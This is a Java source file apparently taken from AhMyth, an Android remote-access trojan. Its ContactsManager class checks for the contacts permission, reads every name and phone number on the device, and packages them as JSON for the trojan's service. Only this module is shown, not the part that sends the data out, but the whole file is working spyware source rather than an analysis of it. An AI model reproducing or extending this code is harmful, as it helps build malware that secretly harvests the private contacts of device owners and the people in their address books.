package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;

import androidx.core.app.ActivityCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/**
 * Created by AhMyth on 11/11/16.
 */

public class ContactsManager {

    // Verifica si el permiso READ_CONTACTS está concedido
    private static boolean hasContactsPermission(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_CONTACTS)
                    == PackageManager.PERMISSION_GRANTED;
        } else {
            return true;
        }
    }

    public static JSONObject getContacts() {

        Context context = MainService.getContextOfApplication();

        if (!hasContactsPermission(context)) {
            JSONObject errorObj = new JSONObject();
            try {
                errorObj.put("contactsList", false);
                errorObj.put("error", "READ_CONTACTS permission not granted");
            } catch (JSONException e) {}
            return errorObj;
        }

        Cursor cur = null;
        try {
            JSONObject contacts = new JSONObject();
            JSONArray list = new JSONArray();

            cur = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
                    null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

            if (cur != null) {
                while (cur.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                    contact.put("phoneNo", num);
                    contact.put("name", name);
                    list.put(contact);
                }
                cur.close();
            }

            contacts.put("contactsList", list);
            return contacts;

        } catch (JSONException e) {
            e.printStackTrace();
            JSONObject errorObj = new JSONObject();
            try {
                errorObj.put("contactsList", false);
                errorObj.put("error", "JSON error: " + e.getMessage());
            } catch (JSONException ee) {}
            return errorObj;
        } finally {
            if (cur != null && !cur.isClosed()) cur.close();
        }
    }
}